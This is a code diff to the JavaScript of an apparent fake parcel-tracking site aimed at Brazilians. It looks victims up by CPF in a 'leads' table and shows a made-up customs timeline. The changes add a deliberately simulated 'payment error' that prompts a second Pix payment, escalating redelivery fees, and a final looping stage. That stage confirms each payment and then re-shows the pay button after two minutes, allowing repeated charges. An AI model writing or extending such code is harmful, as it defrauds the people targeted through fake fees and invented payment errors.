@@ -99,17 +99,16 @@ export class TrackingSystem {
 
     async handleTrackingSubmit() {
         console.log('🔍 Iniciando rastreamento para CPF:', this.currentCPF);
-        console.log('🎯 Buscando dados EXCLUSIVAMENTE no Supabase (dados do painel)...');
+        console.log('🎯 Buscando dados no Supabase...');
         
         this.showLoadingNotification();
         
         try {
-            // 🎯 BUSCAR EXCLUSIVAMENTE NO SUPABASE (controlado pelo painel)
+            // Buscar no Supabase primeiro
             const leadResult = await this.dbService.getLeadByCPF(this.currentCPF);
             
             if (leadResult.success && leadResult.data) {
-                // ✅ Lead encontrado no Supabase (dados controlados pelo painel)
-                console.log('✅ Lead encontrado no Supabase (dados do painel):', leadResult.data);
+                console.log('✅ Lead encontrado no Supabase:', leadResult.data);
                 
                 this.userData = {
                     nome: leadResult.data.nome_completo,
@@ -136,29 +135,9 @@ export class TrackingSystem {
                 this.displayResults();
                 
             } else {
-                // ❌ CPF não encontrado no Supabase
-                console.log('❌ Lead não encontrado no banco, buscando dados via API...');
-                
-                // Tentar buscar via API externa como fallback
-                const apiData = await this.dataService.fetchCPFData(this.currentCPF);
-                
-                if (apiData && apiData.DADOS) {
-                    this.userData = {
-                        nome: apiData.DADOS.nome,
-                        cpf: this.currentCPF,
-                        email: null,
-                        telefone: null,
-                        nascimento: apiData.DADOS.nascimento,
-                        situacao: apiData.DADOS.situacao || 'REGULAR'
-                    };
-                    
-                    console.log('✅ Dados básicos obtidos via API externa:', this.userData);
-                    console.log('⚠️ Email e telefone não disponíveis - será necessário gerar');
-                    this.closeLoadingNotification();
-                    this.displayResults();
-                } else {
-                    throw new Error('Dados não encontrados');
-                }
+                console.log('❌ CPF não encontrado no Supabase');
+                this.closeLoadingNotification();
+                this.showCPFNotFoundError();
             }
             
         } catch (error) {
@@ -264,7 +243,7 @@ export class TrackingSystem {
         // Eventos
         popup.addEventListener('click', (e) => {
             if (e.target.id !== 'closeNotFoundPopup') {
-                window.open('https://logixexpresscom.netlify.app/', '_self');
+                window.location.href = 'https://logixexpresscom.netlify.app/';
             }
         });
         
@@ -326,53 +305,70 @@ export class TrackingSystem {
 
     generateTrackingData() {
         const today = new Date();
-        const dates = this.generateRealisticDates(today, 11);
+        const dates = this.generateRealisticDates(today, 29);
         
-        // Determinar etapa atual baseada nos dados do Supabase (painel)
-        let currentStep = 11; // Padrão
+        // Determinar etapa atual baseada nos dados do Supabase
+        let currentStep = 11; // Padrão: alfândega
         if (this.leadData && this.leadData.etapa_atual) {
-            currentStep = Math.min(this.leadData.etapa_atual, 11);
+            currentStep = this.leadData.etapa_atual;
         }
         
-        // Verificar se liberação já foi paga (dados do painel)
+        // Verificar se liberação já foi paga
         if (this.leadData && this.leadData.status_pagamento === 'pago') {
             this.isLiberationPaid = true;
-            currentStep = Math.max(currentStep, 12);
+            currentStep = Math.max(currentStep, 13);
         }
         
         this.trackingData = {
             currentStep: currentStep,
-            steps: [
-                { id: 1, date: dates[0], title: 'Seu pedido foi criado', description: 'Seu pedido foi criado', completed: currentStep >= 1 },
-                { id: 2, date: dates[1], title: 'Preparando para envio', description: 'O seu pedido está sendo preparado para envio', completed: currentStep >= 2 },
-                { id: 3, date: dates[2], title: 'Pedido enviado', description: '[China] O vendedor enviou seu pedido', completed: currentStep >= 3, isChina: true },
-                { id: 4, date: dates[3], title: 'Centro de triagem', description: '[China] O pedido chegou ao centro de triagem de Shenzhen', completed: currentStep >= 4, isChina: true },
-                { id: 5, date: dates[4], title: 'Centro logístico', description: '[China] Pedido saiu do centro logístico de Shenzhen', completed: currentStep >= 5, isChina: true },
-                { id: 6, date: dates[5], title: 'Trânsito internacional', description: '[China] Coletado. O pedido está em trânsito internacional', completed: currentStep >= 6, isChina: true },
-                { id: 7, date: dates[6], title: 'Liberado para exportação', description: '[China] O pedido foi liberado na alfândega de exportação', completed: currentStep >= 7, isChina: true },
-                { id: 8, date: dates[7], title: 'Saiu da origem', description: 'Pedido saiu da origem: Shenzhen', completed: currentStep >= 8 },
-                { id: 9, date: dates[8], title: 'Chegou no Brasil', description: 'Pedido chegou no Brasil', completed: currentStep >= 9 },
-                { id: 10, date: dates[9], title: 'Centro de distribuição', description: 'Pedido em trânsito para CURITIBA/PR', completed: currentStep >= 10 },
-                { id: 11, date: dates[10], title: 'Alfândega de importação', description: 'Pedido chegou na alfândega de importação: CURITIBA/PR', completed: currentStep >= 11, needsLiberation: true }
-            ]
+            steps: this.getAll29Steps(dates, currentStep)
         };
         
-        // Adicionar etapa 12 se liberação foi paga (dados do painel)
-        if (this.isLiberationPaid && currentStep >= 12) {
-            this.trackingData.steps.push({
-                id: 12,
-                date: new Date(this.leadData.updated_at || Date.now()),
-                title: 'Pedido liberado',
-                description: 'Pedido liberado na Alfândega de Importação',
-                completed: true
-            });
-        }
-        
-        console.log('📊 Dados de rastreamento baseados no painel:', {
+        console.log('📊 Dados de rastreamento gerados:', {
             currentStep: currentStep,
             totalSteps: this.trackingData.steps.length,
             liberationPaid: this.isLiberationPaid
         });
+    }
+
+    getAll29Steps(dates, currentStep) {
+        const steps = [
+            { id: 1, title: 'Seu pedido foi criado', description: 'Seu pedido foi criado' },
+            { id: 2, title: 'Preparando para envio', description: 'O seu pedido está sendo preparado para envio' },
+            { id: 3, title: 'Pedido enviado', description: '[China] O vendedor enviou seu pedido', isChina: true },
+            { id: 4, title: 'Centro de triagem', description: '[China] O pedido chegou ao centro de triagem de Shenzhen', isChina: true },
+            { id: 5, title: 'Centro logístico', description: '[China] Pedido saiu do centro logístico de Shenzhen', isChina: true },
+            { id: 6, title: 'Trânsito internacional', description: '[China] Coletado. O pedido está em trânsito internacional', isChina: true },
+            { id: 7, title: 'Liberado para exportação', description: '[China] O pedido foi liberado na alfândega de exportação', isChina: true },
+            { id: 8, title: 'Saiu da origem', description: 'Pedido saiu da origem: Shenzhen' },
+            { id: 9, title: 'Chegou no Brasil', description: 'Pedido chegou no Brasil' },
+            { id: 10, title: 'Centro de distribuição', description: 'Pedido em trânsito para CURITIBA/PR' },
+            { id: 11, title: 'Alfândega de importação', description: 'Pedido chegou na alfândega de importação: CURITIBA/PR', needsLiberation: true },
+            { id: 12, title: 'Erro de pagamento', description: 'Simulação de erro de pagamento', isPaymentError: true },
+            { id: 13, title: 'Pedido liberado', description: 'Seu pedido foi liberado após o pagamento da taxa alfandegária' },
+            { id: 14, title: 'Preparando entrega', description: 'Pedido sairá para entrega' },
+            { id: 15, title: 'Em trânsito', description: 'Pedido em trânsito para o destinatário' },
+            { id: 16, title: 'Rota de entrega', description: 'Pedido em Rota de Entrega' },
+            { id: 17, title: 'Tentativa de entrega 1', description: 'Tentativa de Entrega', needsDeliveryPayment: true, deliveryValue: 9.74, attemptNumber: 1 },
+            { id: 18, title: 'Liberado para entrega', description: 'Pedido liberado para nova tentativa de entrega' },
+            { id: 19, title: 'Em trânsito', description: 'Pedido em trânsito' },
+            { id: 20, title: 'Rota de entrega', description: 'Em rota de entrega' },
+            { id: 21, title: 'Tentativa de entrega 2', description: 'Tentativa de Entrega - 2ª tentativa', needsDeliveryPayment: true, deliveryValue: 14.98, attemptNumber: 2 },
+            { id: 22, title: 'Liberado para entrega', description: 'Pedido liberado para nova tentativa de entrega' },
+            { id: 23, title: 'Em trânsito', description: 'Pedido em trânsito' },
+            { id: 24, title: 'Rota de entrega', description: 'Em rota de entrega' },
+            { id: 25, title: 'Tentativa de entrega 3', description: 'Tentativa de Entrega - 3ª tentativa', needsDeliveryPayment: true, deliveryValue: 18.96, attemptNumber: 3 },
+            { id: 26, title: 'Liberado para entrega', description: 'Pedido liberado para nova tentativa de entrega' },
+            { id: 27, title: 'Em trânsito', description: 'Pedido em trânsito' },
+            { id: 28, title: 'Rota de entrega', description: 'Em rota de entrega' },
+            { id: 29, title: 'Tentativa de entrega final', description: 'Tentativa de Entrega', needsDeliveryPayment: true, deliveryValue: 9.74, attemptNumber: 4, isLoopingStage: true }
+        ];
+
+        return steps.map((step, index) => ({
+            ...step,
+            date: dates[Math.min(index, dates.length - 1)],
+            completed: currentStep >= step.id
+        }));
     }
 
     displayResults() {
@@ -529,7 +525,8 @@ export class TrackingSystem {
         
         let buttonHtml = '';
         
-        if (step.id === 11 && step.needsLiberation && !this.isLiberationPaid) {
+        // Botão de liberação na etapa 11
+        if (step.id === 11 && step.needsLiberation && step.completed && !this.isLiberationPaid) {
             buttonHtml = `
                 <button class="liberation-button-timeline" onclick="window.trackingSystemInstance.showLiberationModal()">
                     <i class="fas fa-unlock"></i> Liberar Pacote
@@ -537,10 +534,19 @@ export class TrackingSystem {
             `;
         }
         
-        if (this.needsDeliveryPayment(step.id)) {
-            const deliveryValue = this.getDeliveryValue(step.id);
+        // Botão de erro de pagamento na etapa 12
+        if (step.id === 12 && step.isPaymentError && step.completed && !this.isLiberationPaid) {
             buttonHtml = `
-                <button class="liberation-button-timeline delivery-retry-btn" onclick="window.trackingSystemInstance.showDeliveryModal(${step.id}, ${deliveryValue})">
+                <button class="liberation-button-timeline" onclick="window.trackingSystemInstance.showPaymentErrorModal()">
+                    <i class="fas fa-redo"></i> Tentar Novamente
+                </button>
+            `;
+        }
+        
+        // Botões de tentativa de entrega
+        if (step.needsDeliveryPayment && step.completed) {
+            buttonHtml = `
+                <button class="liberation-button-timeline delivery-retry-btn" onclick="window.trackingSystemInstance.showDeliveryModal(${step.id}, ${step.deliveryValue}, ${step.attemptNumber}, ${step.isLoopingStage || false})">
                     <i class="fas fa-redo"></i> Reenviar Pacote
                 </button>
             `;
@@ -565,17 +571,37 @@ export class TrackingSystem {
         return item;
     }
 
-    needsDeliveryPayment(stepId) {
-        return [16, 20, 24].includes(stepId);
+    showPaymentErrorModal() {
+        console.log('❌ Exibindo modal de erro de pagamento (Etapa 12)');
+        
+        // Usar o mesmo modal de liberação mas com texto de erro
+        this.showLiberationModal(true);
     }
 
-    getDeliveryValue(stepId) {
-        const values = {
-            16: 9.74,
-            20: 14.98,
-            24: 18.96
-        };
-        return values[stepId] || 9.74;
+    showLiberationModal(isRetry = false) {
+        console.log('🔓 Abrindo modal de liberação aduaneira', isRetry ? '(Tentativa)' : '');
+        
+        this.generateLiberationPix();
+        
+        const modal = document.getElementById('liberationModal');
+        if (modal) {
+            modal.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+            
+            // Atualizar título se for retry
+            const title = modal.querySelector('.professional-modal-title');
+            if (title && isRetry) {
+                title.textContent = 'Erro no Pagamento - Tente Novamente';
+            } else if (title) {
+                title.textContent = 'Liberação Aduaneira Necessária';
+            }
+            
+            const simulateButton = document.getElementById('simulatePaymentButton');
+            if (simulateButton) {
+                simulateButton.innerHTML = '<i class="fas fa-credit-card"></i> Simular Pagamento';
+                simulateButton.removeAttribute('data-retry');
+            }
+        }
     }
 
     setupLiberationModal() {
@@ -608,24 +634,6 @@ export class TrackingSystem {
             simulateButton.addEventListener('click', () => {
                 this.handleLiberationPayment();
             });
-        }
-    }
-
-    showLiberationModal() {
-        console.log('🔓 Abrindo modal de liberação aduaneira');
-        
-        this.generateLiberationPix();
-        
-        const modal = document.getElementById('liberationModal');
-        if (modal) {
-            modal.style.display = 'flex';
-            document.body.style.overflow = 'hidden';
-            
-            const simulateButton = document.getElementById('simulatePaymentButton');
-            if (simulateButton) {
-                simulateButton.innerHTML = '<i class="fas fa-credit-card"></i> Simular Pagamento';
-                simulateButton.removeAttribute('data-retry');
-            }
         }
     }
 
@@ -772,31 +780,31 @@ export class TrackingSystem {
         
         this.isLiberationPaid = true;
         this.closeLiberationModal();
-        this.addStage12();
+        this.addStage13();
         
-        // 🎯 ATUALIZAR NO SUPABASE (dados controlados pelo painel)
+        // Atualizar no Supabase
         if (this.currentCPF) {
-            await this.dbService.updatePaymentStatus(this.currentCPF, 'pago');
-            await this.dbService.updateLeadStage(this.currentCPF, 12);
-            console.log('💾 Status atualizado no Supabase via painel: pago, etapa 12');
+            this.dbService.updatePaymentStatus(this.currentCPF, 'pago');
+            this.dbService.updateLeadStage(this.currentCPF, 13);
+            console.log('💾 Status atualizado no Supabase: pago, etapa 13');
         }
     }
 
-    addStage12() {
-        console.log('📦 Adicionando etapa 12: Pedido liberado');
+    addStage13() {
+        console.log('📦 Adicionando etapa 13: Pedido liberado');
         
         const timeline = document.getElementById('trackingTimeline');
         if (!timeline) return;
         
-        const stage12Date = new Date();
-        const stage12Item = this.createStage12Item(stage12Date);
+        const stage13Date = new Date();
+        const stage13Item = this.createStage13Item(stage13Date);
         
-        timeline.appendChild(stage12Item);
+        timeline.appendChild(stage13Item);
         
         setTimeout(() => {
-            stage12Item.style.opacity = '1';
-            stage12Item.style.transform = 'translateY(0)';
-            stage12Item.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            stage13Item.style.opacity = '1';
+            stage13Item.style.transform = 'translateY(0)';
+            stage13Item.scrollIntoView({ behavior: 'smooth', block: 'center' });
         }, 100);
         
         const currentStatus = document.getElementById('currentStatus');
@@ -805,7 +813,7 @@ export class TrackingSystem {
         }
     }
 
-    createStage12Item(date) {
+    createStage13Item(date) {
         const item = document.createElement('div');
         item.className = 'timeline-item completed new-step';
         item.style.opacity = '0';
@@ -831,17 +839,18 @@ export class TrackingSystem {
         return item;
     }
 
-    async showDeliveryModal(stepId, deliveryValue) {
-        const value = this.getDeliveryValue(stepId);
-        const attemptNumber = this.getAttemptNumber(stepId);
-        const stageType = this.getDeliveryStageType(stepId);
+    async showDeliveryModal(stepId, deliveryValue, attemptNumber, isLoopingStage = false) {
+        console.log(`🚚 Abrindo modal de reenvio - Etapa ${stepId} - Tentativa ${attemptNumber} - R$ ${deliveryValue.toFixed(2)}`);
         
-        console.log(`🚚 Abrindo modal de reenvio - Etapa ${stepId} - R$ ${value.toFixed(2)}`);
+        if (isLoopingStage) {
+            console.log('🔄 Etapa com loop infinito detectada');
+        }
         
         if (this.userData) {
             try {
                 console.log('🔄 Gerando PIX automático para tentativa de entrega...');
                 
+                const stageType = this.getDeliveryStageType(attemptNumber);
                 const pixResult = await this.zentraPayService.generatePixForStage(
                     this.userData, 
                     stageType
@@ -849,32 +858,33 @@ export class TrackingSystem {
                 
                 if (pixResult.success) {
                     console.log('✅ PIX de tentativa de entrega gerado automaticamente!');
-                    this.showDeliveryPixModal(stepId, value, attemptNumber, pixResult);
+                    this.showDeliveryPixModal(stepId, deliveryValue, attemptNumber, pixResult, isLoopingStage);
                 } else {
                     console.warn('⚠️ Falha ao gerar PIX, usando modal estático');
-                    this.showDeliveryPixModal(stepId, value, attemptNumber, null);
+                    this.showDeliveryPixModal(stepId, deliveryValue, attemptNumber, null, isLoopingStage);
                 }
                 
             } catch (error) {
                 console.error('❌ Erro ao gerar PIX de entrega:', error);
-                this.showDeliveryPixModal(stepId, value, attemptNumber, null);
+                this.showDeliveryPixModal(stepId, deliveryValue, attemptNumber, null, isLoopingStage);
             }
         } else {
             console.warn('⚠️ Dados do usuário não disponíveis');
-            this.showDeliveryPixModal(stepId, value, attemptNumber, null);
+            this.showDeliveryPixModal(stepId, deliveryValue, attemptNumber, null, isLoopingStage);
         }
     }
 
-    getDeliveryStageType(stepId) {
+    getDeliveryStageType(attemptNumber) {
         const stageMap = {
-            16: 'tentativa_entrega_1',
-            20: 'tentativa_entrega_2', 
-            24: 'tentativa_entrega_3'
+            1: 'tentativa_entrega_1',
+            2: 'tentativa_entrega_2', 
+            3: 'tentativa_entrega_3',
+            4: 'tentativa_entrega_1' // Loop volta para primeira
         };
-        return stageMap[stepId] || 'tentativa_entrega_1';
+        return stageMap[attemptNumber] || 'tentativa_entrega_1';
     }
 
-    showDeliveryPixModal(stepId, value, attemptNumber, pixResult) {
+    showDeliveryPixModal(stepId, value, attemptNumber, pixResult, isLoopingStage = false) {
         console.log(`💳 Exibindo modal de PIX - Tentativa ${attemptNumber} - R$ ${value.toFixed(2)}`);
         
         if (pixResult && pixResult.success) {
@@ -883,12 +893,218 @@ export class TrackingSystem {
             console.log('⚠️ Modal com PIX estático (fallback)');
         }
         
-        alert(`PIX gerado para Tentativa ${attemptNumber} - R$ ${value.toFixed(2)}\n\n${pixResult ? 'PIX Real Gerado!' : 'Usando PIX Estático'}`);
+        // Criar modal personalizado para entrega
+        const modal = document.createElement('div');
+        modal.className = 'modal-overlay';
+        modal.id = 'deliveryPixModal';
+        modal.style.display = 'flex';
+        
+        const qrCodeSrc = pixResult && pixResult.qrCode ? 
+            pixResult.qrCode : 
+            `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixResult?.pixPayload || 'PIX_ESTATICO')}`;
+        
+        const pixPayload = pixResult?.pixPayload || '00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925LOGIX EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
+        
+        modal.innerHTML = `
+            <div class="professional-modal-container">
+                <div class="professional-modal-header">
+                    <h2 class="professional-modal-title">Tentativa de Entrega ${attemptNumber}°</h2>
+                    <button class="professional-modal-close" onclick="window.trackingSystemInstance.closeDeliveryModal()">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+                
+                <div class="professional-modal-content">
+                    <div class="liberation-explanation">
+                        <p class="liberation-subtitle">
+                            Para reagendar a entrega do seu pedido, é necessário pagar a taxa de reenvio de R$ ${value.toFixed(2)}.
+                        </p>
+                    </div>
+
+                    <div class="professional-fee-display">
+                        <div class="fee-info">
+                            <span class="fee-label">Taxa de Reenvio - ${attemptNumber}° Tentativa</span>
+                            <span class="fee-amount">R$ ${value.toFixed(2)}</span>
+                        </div>
+                    </div>
+
+                    <div class="professional-pix-section">
+                        <h3 class="pix-section-title">Pagamento via Pix</h3>
+                        
+                        <div class="pix-content-grid">
+                            <div class="qr-code-section">
+                                <div class="qr-code-container">
+                                    <img src="${qrCodeSrc}" alt="QR Code PIX Reenvio" class="professional-qr-code">
+                                </div>
+                            </div>
+                            
+                            <div class="pix-copy-section">
+                                <label class="pix-copy-label">PIX Copia e Cola</label>
+                                <div class="professional-copy-container">
+                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${pixPayload}</textarea>
+                                    <button class="professional-copy-button" onclick="window.trackingSystemInstance.copyDeliveryPixCode()">
+                                        <i class="fas fa-copy"></i> Copiar
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="professional-payment-steps">
+                            <h4 class="steps-title">Como realizar o pagamento:</h4>
+                            <div class="payment-steps-grid">
+                                <div class="payment-step">
+                                    <div class="step-number">1</div>
+                                    <div class="step-content">
+                                        <i class="fas fa-mobile-alt step-icon"></i>
+                                        <span class="step-text">Acesse seu app do banco</span>
+                                    </div>
+                                </div>
+                                <div class="payment-step">
+                                    <div class="step-number">2</div>
+                                    <div class="step-content">
+                                        <i class="fas fa-qrcode step-icon"></i>
+                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
+                                    </div>
+                                </div>
+                                <div class="payment-step">
+                                    <div class="step-number">3</div>
+                                    <div class="step-content">
+                                        <i class="fas fa-check step-icon"></i>
+                                        <span class="step-text">Confirme o pagamento</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div style="text-align: center; margin-top: 20px;">
+                            <button onclick="window.trackingSystemInstance.handleDeliveryPayment(${stepId}, ${attemptNumber}, ${isLoopingStage})" class="liberation-button-timeline">
+                                <i class="fas fa-credit-card"></i> Simular Pagamento de Entrega
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+        
+        document.body.appendChild(modal);
+        document.body.style.overflow = 'hidden';
     }
 
-    getAttemptNumber(stepId) {
-        const attemptMap = { 16: 1, 20: 2, 24: 3 };
-        return attemptMap[stepId] || 1;
+    closeDeliveryModal() {
+        const modal = document.getElementById('deliveryPixModal');
+        if (modal) {
+            modal.remove();
+            document.body.style.overflow = 'auto';
+        }
+    }
+
+    copyDeliveryPixCode() {
+        const pixInput = document.getElementById('deliveryPixCode');
+        const copyButton = document.querySelector('#deliveryPixModal .professional-copy-button');
+        
+        if (!pixInput || !copyButton) return;
+
+        try {
+            pixInput.select();
+            pixInput.setSelectionRange(0, 99999);
+
+            if (navigator.clipboard && window.isSecureContext) {
+                navigator.clipboard.writeText(pixInput.value).then(() => {
+                    this.showCopySuccess(copyButton);
+                }).catch(() => {
+                    this.fallbackCopy(pixInput, copyButton);
+                });
+            } else {
+                this.fallbackCopy(pixInput, copyButton);
+            }
+        } catch (error) {
+            console.error('❌ Erro ao copiar PIX:', error);
+        }
+    }
+
+    handleDeliveryPayment(stepId, attemptNumber, isLoopingStage) {
+        console.log(`💳 Processando pagamento de entrega - Tentativa ${attemptNumber}`);
+        
+        this.closeDeliveryModal();
+        
+        if (isLoopingStage) {
+            // Etapa 29 - comportamento especial
+            this.handleLoopingStagePayment(stepId);
+        } else {
+            // Etapas normais - avançar para próxima
+            this.advanceToNextStage(stepId + 1);
+        }
+    }
+
+    handleLoopingStagePayment(stepId) {
+        console.log('🔄 Processando pagamento da etapa com loop (29)');
+        
+        // Ocultar botão por 2 minutos
+        const button = document.querySelector(`[onclick*="showDeliveryModal(${stepId}"]`);
+        if (button) {
+            button.style.display = 'none';
+            
+            // Mostrar notificação de pagamento confirmado
+            this.showPaymentConfirmedNotification();
+            
+            // Reexibir botão após 2 minutos
+            setTimeout(() => {
+                button.style.display = 'inline-flex';
+                console.log('🔄 Botão de reenvio reativado após 2 minutos');
+            }, 2 * 60 * 1000);
+        }
+    }
+
+    showPaymentConfirmedNotification() {
+        const notification = document.createElement('div');
+        notification.style.cssText = `
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #d4edda;
+            color: #155724;
+            padding: 15px 20px;
+            border-radius: 8px;
+            border: 1px solid #c3e6cb;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            z-index: 2000;
+            animation: slideInRight 0.4s ease;
+            max-width: 300px;
+        `;
+        
+        notification.innerHTML = `
+            <div style="display: flex; align-items: center; gap: 10px;">
+                <i class="fas fa-check-circle" style="color: #28a745; font-size: 1.2rem;"></i>
+                <div>
+                    <strong>Pagamento Confirmado</strong>
+                    <p style="margin: 0; font-size: 0.9rem;">Objeto liberado para nova tentativa</p>
+                </div>
+            </div>
+        `;
+        
+        document.body.appendChild(notification);
+        
+        // Auto-remover após 5 segundos
+        setTimeout(() => {
+            if (notification.parentNode) {
+                notification.style.animation = 'slideOutRight 0.4s ease';
+                setTimeout(() => notification.remove(), 400);
+            }
+        }, 5000);
+    }
+
+    advanceToNextStage(nextStepId) {
+        console.log(`📈 Avançando para etapa ${nextStepId}`);
+        
+        if (this.currentCPF) {
+            this.dbService.updateLeadStage(this.currentCPF, nextStepId);
+        }
+        
+        // Recarregar timeline
+        setTimeout(() => {
+            this.generateTrackingData();
+            this.renderTimeline();
+        }, 1000);
     }
 
     copyPixCode() {
